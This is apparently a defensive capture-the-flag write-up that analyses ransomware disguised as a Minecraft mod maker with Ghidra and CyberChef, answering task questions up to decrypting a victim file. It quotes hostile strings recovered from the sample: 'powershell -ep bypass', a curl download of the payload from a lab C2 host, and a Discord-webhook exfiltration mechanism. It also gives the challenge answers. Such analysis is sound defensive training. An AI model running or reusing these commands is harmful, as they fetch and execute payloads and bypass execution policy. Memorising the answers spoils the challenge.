This Defensive CTF focuses on malware analysis of ransomware disguised as a mod making program

Tools Used:
	Ghidra
	Cyberchef

Task 1. Right from the start, based on the incident details, the .TXT file's contents, and the extension appended to the other .TXT file, what type of malware infection is this?
	Reading D.txt shows that the attackers want 1 BTC, and there's a decryption process, which is exactly like ransomware
	"ransomware"

Task 2. What mechanism does MCModMaker-v.1.4.exe use to send information back to the C2 server?
	After opening MCModMaker-v.1.4.exe in Ghidra, I went to Namespaces -> main (This shows all the custom functions of the malware)
	The important function for C2 is sendToDiscord
	Discord uses webhooks to transfer information, so the answer is
	"webhook"

Task 3. What command does MCModMaker-v.1.4.exe run suggesting that it is meant to execute other binaries or scripts?
	Going through the main variables, I saw a string that when ran could execute other scripts
	"powershell -ep bypass"

Task 4. What is the value of the API key contained within the URL which suggests it enumerates geolocation data?
	In main, looking at the rest of the variables, I saw a string "curl https://hunnid.htb/api/v2/country,city,vpn?apiKey=ZVBOKX3P8H7"
	"ZVBOKX3P8H7"

Task 5. What domain is the C2 server that serves the ransomware payload?
	Still in main, I found a string "curl -o goteem.exe http://goteem.htb:8080/goteem.exe"
	"goteem.htb"

Task 6. While analyzing the MCModMaker-v.1.4.exe, what format is the data that is returned to the C2 server?
	Going back to the function called sendToDiscord, there is a variable that is a string of headers and one of them is 
	"application/json"

Task 7. What specific filetype is enumerated by goteem.exe for encryption?
	Opening goteem.exe in Ghidra, then I went to Namespaces -> main, just like before, to find functions
	I noticed one function called findTxtFiles,
	"txt"

Task 8. What is the full string that's displayed when goteem.exe enumerates a restricted Windows folder?
	I looked through findTxtFiles function, and it led me to findTxtFiles.func1, which has a hardcoded error string "Skipping directory: %s (access denied)\n"
	"Skipping directory: %s (access denied)"
	
Task 9. Within the encryptFile function, in case file was read successfully, what is the function name found at the call instruction?
	Reading the encryptFile function shows it starts with a bunch of error catching, the first one is if the file is not read properly.
	If it is read properly, the next section creates a cipher using crypto/aes.NewCipher
	"crypto_aes_NewCipher"
	
Task 10. What is the decryption key?
	The decryption key is passed in as params_3, 4, and 5.
	Using the references feature and looking for calls leads us to main.main.gowrap1, so I opened main.main
	Scrolling through, I found where it calls main.main.gowrap, and parms_3, 4, and 5 are mVar19.
	mVar19 leads to a hex.decodeString of 
	"6368616e676520746869732070617373"
	
Task 11. What is the name of the project in the encrypted .TXT file?
  The first 12 bytes of the encrypted file are the IV "48e9c2921d8b71e47816ab77" (this is the IV in hex)
  The last 16 bytes of the encrypted file are the GCM Tag "d0a0b53ffee5080a43a81d035b19dc98"(this is the GCM tag in hex)
	The key from Q10 is in hex
	Mode is GCM and input/output I set to Hex/Raw
  [Cyber Chef Recipe](https://gchq.github.io/CyberChef/#recipe=Drop_bytes(0,12,false)Drop_bytes(-16,16,false)AES_Decrypt(%7B'option':'Hex','string':'6368616e676520746869732070617373'%7D,%7B'option':'Hex','string':'48e9c2921d8b71e47816ab77'%7D,'GCM','Raw','Raw',%7B'option':'Hex','string':'d0a0b53ffee5080a43a81d035b19dc98'%7D,%7B'option':'Hex','string':''%7D)&input=SOnCkh2LceR4Fqt3de%2B1CSyntiIKA4gWaYm5iVnNprlVUNeufq0yoDshsg%2BtUp/hO5vQHAGAohpL6ltpjQrn7S98FYvFem31udEZmufsm8FRH85mC91c45GQOI6EbQlii08u76vgJiAoRqztWuJ3rzh8SqS/boFjP73IZ6QMycn%2BSoPkPFRJhMNVan6N4vGkgKlOO1WlAlk8g39F4xLbMK2p%2BJ3RgQwCfBcab4Pwm6MfPMuetiIQr1ih79VuObZikCJcg1hjqM8ZA4X5RsKdguiAq%2BS7YgLc2pHQC7Uc9XhR8%2Bnyi%2BbzhbplQdqNR%2B/1GyleBEdapKBBEaTCx2Bgpn1BK089g92Tl4I/eYhAnaYYe6H3r/CZ%2BDwaFKn2HEaGEAZiihXLeJ4yrYySETBoFqk%2BGj1q/sRk%2BSR5gPI6dTt%2BEjcT96VNqJjeLl%2BQjhlcbNefl5ay8d6m27gjTGOSP/dE37CK5w6WP9gdZwHqmqONSxXRnWA/0TTH%2BC46%2BW/i/RrnDDP/lkqOo3WiBuL3GwwNZuXaHfPZrL3Jv5vFdoQLCq%2BgxUj3CoiqxEDwpZQQpPMXVaQTy4Em0MYaYvhYVxIpRGo3y6tQ6qeagUpuxPtuWYBVh9NwICVDgR4sZiJtZDNvOX53BqWopqK/uvzKTS3hAbbaAFs2WGzKuvMjefJ1orHZTWIxssWkqyh8PwufcABDP5%2BhfvFIFlEPLjvHut7FlXi7CjB%2BZ888bhjDYMxl%2BG5jdWaFi2Sncw%2BrxM64jrsj0Bm1MOFlfnDnbW5k6xU9jCr1%2Bi%2BGZUn3CwYh6nag0PWolC4R0YPdzLGJU2q7ziZCJE/RNpQpfmmp0VgP7HjaxuYMKFIIETV3iNIGE2no6qqKbiOuTnAt1Qylua0W6Agp0vpjVK4kYON8CIdFHwdIM0NtqdvqQo7RJNAkOx1Uf7tX3RTWKneRqtsbtOVjFIDL1UVPFaMoYVR2cNUtHLdBUZJt8MO0FINzhWf5TFUcGwqkIQtcTwd%2BbMTD7I8U2feM1wcb8FZnY7Y7bMfj1CYcHFrq%2BZKTHXCgCPcS3yjIL8KGhFAdsCunELrikVGWDRrCz/hSkcSF5VI5DWMYnplUP67I3a3NjfDxTkbJi1Cx/439BQZU945W1obP3nV07XZrASPmTvVZSXnyuvAPzca/STxdAv5udYdlRW4XZDVWZh7xXjVaXEOO6vLUdSrBChiObe46eFQR6yvwoQyTNXjez0%2BITknXTPKAy77Zpa1dsimEUQqw0C2CGp7I%2BCeAFWOldpCLWWXPmq%2BEtqbNV9L7Y47JbuAHYMcOJfwRlpN03jdUspfJ6s6nDxEOjHmNm%2B4zrQqLKhKfSKuC1HsYPKmwqRJmxASeXokXwU7QhjSxfOgUhg94DAKuji04VWE1gjPTJhhVTDXCJ9w34WrmlPvhZ9y4bQrjuhDDDrx008Sz42kv1kci3%2BgiSlLwOrpqJx9AnXEf2y5C52ulNMPhIt%2BNjIy%2BztKOVf/6RUz75r2R7y9HKVJZITwPE5BPcP35IvhkucBDJ50wCt2UJittlf/oFi%2B7UQrQp2sVelWB1hT9ZMO9JhF3zKWpa9Rdfmo8Zy8Yal2aaYiK5b8SrctCw0%2BjFJEZdv4r6JcZ8LPS6/G1TEB5UiSpGNBz9xAGe5hDEdS8HsvuT1BLhEPuY3JkH8FEKiCJnHA0K8TX6lldnAkwn4zVHyHf7EnmLMvyzLbqvHywz%2BYu6REjXSH9t9AvaWU0jip4sqoDNIVk0B8mVxizjPvUDhKdOMWGwF7Bnf5wum17dnFAML9K050lIeczlx%2BRmtClyEvzbvzFCWo1P7M9dAfoWNHBLKp4rlMTBAVFjTEnGUQJrUMqfVJP91Na9wdFKyrcvZ0cRxVnNNWolcR/SrLVP2aOtx14uOZSFm5EyRSNHSiQzs8NYxnU/QGRi63UT3qEbrEPyE%2BXMxYv0Yo%2BRz76dgml3yKIJ7IPHD/jXgTFPMmUgaHdJu%2BnEbfbCM/45fXZEXWYtWickW6tCPOJFpzgj2rHlt6c67HlvBc/rm4I1Pu8d44ipUwrNsjR%2Bg6Eg4tKSIjd34cGUVjI%2BqXvaj/y7l9O4E0uq5rKRncU0so4yCmayHPoxeTkssfnEs5K829G282/dG4lWm4gIrW3HfT9SOM1uTpTH93QyxKcog64y070s2KmcVWWNnAMRs8QIQK7UtFxQ9DLPZELGSzCel1rZgGeMJEglQiSKQJnsFB2Z1y25H3EM6fPabKZI7Z4L2GBUHajYwMpWffipdl26PVxMRc6MiP8U9CRp9lZr0KbQkOSiRVGvy3voTyYRchxzXQkxs7v3MoD7Y/D%2BHvBIBOGXaI8xTJRyI8oWasiV3KVHaTiO3eXI3tihwCzzrdx/SkqpdjcVwM/bKwHVhgmsxhGIHTeTy3nU15I8csQnzEQ1r/JmNv15Elx7RkZ0/gcAcqEfnBjnN/9vTNzewrM6ujLsPTPpxgRpAuAdPe7QwaDLrGlWoWe5XVZdevP09fruHYxL8TH8IHz%2BXH4sYmVAvKEwP0zwhetmz4IWpZdszCa6gVUcAbUZ7GEQAW%2BF3hcbpqyj4RfxHPRsuB7UFsSF5LxN%2BmajgLDRkzH5jVQU7gWPSRoSWzLQRqhydszmf%2BO%2B9A8jjSssdvOMDFyLDL9wp1vYEsG6NSvhzuljtptFuY5Tqks8mV4ACv4vG2xo9E9iB3HqiSlMLiz4/VhxoIzf9SD9pGlsU6H8U8hes87mm10KFXA%2B/bmB2Z/CRDK5OxXe8ck9Y7o3OOtSabDIUQuMV7kJ3oqPlA52BC/o97I0TIpRaFLy%2BkHEuc9HL0bTawXhcQiFrm4ohZLiaZ3NvWYQcJPV9TNpY6jwRB5sIDep6iT/upp8zDbHhwb%2Bjaln0D6UgxNSinNdKNH2IaGqyWwIVWjqIGqIAFr8KX2X/ZLytTsGC53WEjMI/neUMLLCvnNAgX1JLhT9uuwO92J95kJOBKj5RBd7Fd/2ktd0GyYbOUs/AFVrjdWi/RKKMXJWjDfCuzTshlrgeJ/BKmv2KU4wdEF8W/P4JQRZGxdujwqROu5m6wzddfauDuVfsC46XzUUWd%2B44/hKgSckluKZrEtZ3xQhA6La9OxwZXqj4Ogzg2v0xdCkbeFghYfQwKGfnpyXtCu1guX7mfwqJDW2uFy1bPh%2B/ePiYXeM5miThOlyvdvLpyuYoNOeV5HO0G9s3ffRotOojAS5QyS7EC1OAUFpSidRetSiTxsaztN5HOzdQPLx45JzFjdETbPNYKlkmPAZq6OzAoJddtcC8j0M04pEIN/s3c%2BX3IcbjdfIqZtXNiFtyi2%2BwKQ7n0VZSQYc1Q/4JA6/8HapPSoQYOgm%2Bl6ulHpYGkVWMt8cM1PswMFhW2dyApKdZlUJk67RniG/JG1KuhVBJGFtuhr9HcvlvvV03b%2BuUV0%2BCVqjFgo5Xq2FDqF4m05zjT3%2BT5FqRp11Ojf9Z2QIOdFtsWywo5rNqipWzsYUKyo4F1glSJxoAt00cn9nHuww8WxHv%2Butcw%2Bx7tnFPwloDxYu5OvJNjtphRUf2Kl9W%2BKU0bol10tNbXLyi9Pf/oKoOtKog0%2Bszj4WNzt6URAy29hHabXfDcRS5rwx%2BEDPTPsAt8Gnazo%2B/lnh7czpdZnw8dxglz7%2B7KWfq3Rh/lrGRxjqQXaoP12mzfkOVNu8hpmfKJlA9G0KiGRI%2BZQZfdZ8TCy5hdG66%2BBnjIblf1NECUHTRT6OVBxLZVSPL1Y1jwmGiZscE8N0tQ1fsr7vw6tdaTfNOZsoAkxHqJtan1L7z9AJIqFWijUokWX2TJZjGvUZGePW7PRn9W/mqzvPxvlijybJtcGmLGPu4qvP0lzja61Dcw3/F7R3b1USM5yMKn9W9HiI1/4NgZCiioBUUdHH97DfNZmI42G1DgMvYOFy9JmITkLyFcnjlTNBZpGatFre/ns0/1ubWvMXmHATDc8t7McqJrzNLCT3QaxToqtI08UmfJTytVWAFBWSnLeRIENlRD%2BcFlltWSPFtuOHaKwcGipjvRsyD6GSo0YLdlyNtfNcfmkGOgTS05Eak4fYrJS%2BByLe/4WL/w%2BCTunHmGCqkqIty9q8nuDiYhw1b3OLw6Wi4wEW062B8A0bh/amUEeBuA8pPLvC0oIapAS37nsFzOTDRyOs0YpRRO06aCK2xS7Fgl9ldWlXS1ZPL0HhHk8B6v4Gz8q%2B715qFBrW6veI0M1VU8XDYk1AvI7ztli44UwQAoirba2Kt8ZdXWULFbFMAdf/0MRgmh/m4xnVURKn1dCMlpYikoWnpZ0LsBvqmHlL4C5JZFdpPcvQserP1docrX9kuu8JrB4SRCW4nuQWfFtZY8HkXa8gtZi8fhQXwhtSCPLTP62BZrufRclrHL0NUIvAJHeG3HRSDbc4YbEsUXxy455nHk/9wAWym2GoQxhScO1faXbPRpn2jT/r18kUsfKcwnKIzZWywT6%2BvlAPZauNpKFqRHTcfUNGHxcwouwHcUYSgDNLyK1Rxl2biuzidFbojOO6Zn7o3E5HJMS8rVLEbRMqL7vMcDLMRRtp814ikcvpzoJrWNzp5a0WcBoDfq/PbUiUfaNHWYuLL1mea1ipe7LDJlGJFFBivr9NTRZnoCFOEnBXPlmzCqY6uwI7CMPipuKpNKKtqHEgo/iH2Zmhs13RFk4KPGvKJGqXfsLVA6X5L72%2BhDC3tVrjWY%2BBP%2B8aLmp6wqgcUrfea23PNN7R3nwl9LOj6cVPNJCsJTxwXH/DncyMX7NKDGiIrNcrqMDIH0ls5YljeLBquxcsx72vqNrUJMC81IwkgQ0wfPYW%2BGiryLfybTVfxMW2BstRMOgpnJzwSrLVNbJlMdjHoT6K2CnJ0disyjXmlgQgfOKWsOWHafbdZMvBS4mnVVVTbGGana6kwWdx0ihcFjvTzPUiC%2BrjmPrLBgq/QNtGTuWgQ3SFzR0Yecj%2B9MFgv0VJRLrYvVpvolNixDmt81iORbIpl4W9kaGnZYCWGxf7McenFtQMdaOFNYKdkKNGNyUd4vaNhzRpCGNxNPQtCMcRNFJDHagkxhpEaQoQZjZynCU105johzVjBVnmudXkwRAPVUgVJXyzf/7QB3%2B6FEvC6syhjCxM/GauMjitiKslD6vKt8uwaYPVWXfU9CgtT/%2B5QgKQ6gdA1sZ3Jg&oenc=65001&oeol=CRLF)
	"AI Coding Chatbot"
